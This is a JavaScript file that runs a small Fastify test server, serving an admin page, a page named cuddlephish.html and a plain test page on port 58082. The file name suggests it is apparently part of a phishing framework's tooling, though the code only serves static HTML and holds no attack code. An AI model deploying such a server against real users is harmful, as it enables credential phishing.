import fs from 'fs'
import path from 'path'
const __dirname = path.resolve()
import Fastify from 'fastify'

console.log('Testing raw HTML serving...')

const fastify = Fastify({
  logger: false,
  bodyLimit: 19922944
})

//admin route - raw HTML
fastify.route({
  method: ['GET'],
  url: '/admin',
  handler: async function (req, reply) {
    console.log('Serving raw admin.html')
    let stream = fs.createReadStream(__dirname + "/admin.html")
    reply.type('text/html').send(stream)
  }
})

//main route - raw HTML
fastify.route({
  method: ['GET'],
  url: '/',
  handler: async function (req, reply) {
    console.log('Serving raw cuddlephish.html')
    let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
    reply.type('text/html').send(stream)
  }
})

// Test route with simple HTML
fastify.route({
  method: ['GET'],
  url: '/test',
  handler: async function (req, reply) {
    console.log('Serving test HTML')
    reply.type('text/html').send('<html><body><h1>Test Page Works!</h1><p>If you see this, the server is working.</p></body></html>')
  }
})

// Run the server!
const start = async () => {
  fastify.listen({ port: 58082, host: '0.0.0.0' }, (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    console.log(`🚀 Raw HTML test server listening on port 58082`)
    console.log(`🧪 Test page: http://localhost:58082/test`)
    console.log(`📄 Raw admin: http://localhost:58082/admin`)
    console.log(`📄 Raw main: http://localhost:58082/`)
  })
}

start() 